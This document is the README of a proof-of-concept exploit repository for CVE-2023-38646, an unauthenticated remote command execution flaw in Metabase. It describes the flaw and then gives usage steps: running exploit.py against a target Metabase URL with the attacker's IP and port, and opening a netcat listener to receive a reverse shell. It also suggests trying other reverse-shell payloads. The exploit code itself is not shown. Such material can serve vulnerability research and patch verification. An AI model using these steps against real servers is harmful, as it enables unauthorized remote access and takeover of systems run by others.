# CVE-2023-38646 PoC

## Description

This is a Proof of Concept (PoC) script for exploiting Metabase, an open-source business intelligence and data analytics tool. Metabase allows users to visualize and interact with their data, making it a powerful platform for data analysis.

This vulnerability, designated as CVE-2023-38646, allowed attackers to execute arbitrary commands on the server without requiring any authentication. The impact of this flaw was severe, as it granted unauthorized access to the server at the server's privilege level. 

## Proof of Concept (PoC) Steps

<img src="poc.png" alt="" >

1. **Install Dependencies**: Ensure that you have Python installed on your system. You may need to install additional Python packages using pip, such as `requests` and `argparse`.

2. **Clone this Repository**: Clone this GitHub repository to your local machine.

    ```bash
    git clone https://github.com/yourusername/metabase-exploit-poc.git
    ```

3. **Navigate to the Repository**: Change your working directory to the cloned repository.

    ```bash
    cd metabase-exploit-poc
    ```

4. **Run the Script**: Execute the Python script, providing the required arguments for the target Metabase server, your IP address, and a chosen port for the reverse shell.

    ```bash
    python exploit.py -u http://target-metabase-server -i your-ip-address -p chosen-port
    ```

5. **Set Up a Netcat Listener**: Before running the script, ensure that you have a netcat (nc) listener ready on the specified port.

    ```bash
    nc -nlvp chosen-port
    ```

6. **Exploitation**: The script will attempt to send a reverse shell to the target Metabase server. If successful, you will receive a shell on your machine. Feel free to change the payload to try different reverse shells.

## References

- GitHub Advisory: https://github.com/advisories/GHSA-jg32-8h6w-x7vg

- Metabase Advisory: https://www.metabase.com/blog/security-advisory

- Metabase GitHub: https://github.com/metabase/metabase

- Assetnote Blog - Chaining our way to Pre-Auth RCE in Metabase: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
